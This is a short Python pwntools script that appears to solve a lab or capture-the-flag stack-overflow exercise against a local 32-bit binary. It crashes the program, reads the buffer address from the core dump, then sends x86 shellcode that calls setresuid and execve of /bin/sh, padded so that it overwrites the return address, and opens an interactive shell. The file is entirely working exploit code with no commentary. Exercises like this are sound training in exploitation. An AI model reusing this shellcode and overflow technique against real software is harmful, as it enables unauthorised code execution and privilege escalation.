#!/usr/bin/env python

from pwn import *

p = process("./stack-ovfl-sc-32")
SHELLCODE = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'

print(p.recv())
buff = "A" * 0x90
p.send(buff)
p.wait()

c = Core('core')

buff_addr = c.stack.find(buff)
print(hex(buff_addr))
p=process("./stack-ovfl-sc-32")

buf = SHELLCODE
buf += "A" * (0x88 + 4 - len(SHELLCODE))
buf += p32(buff_addr)
p.sendline(buf)
p.interactive()

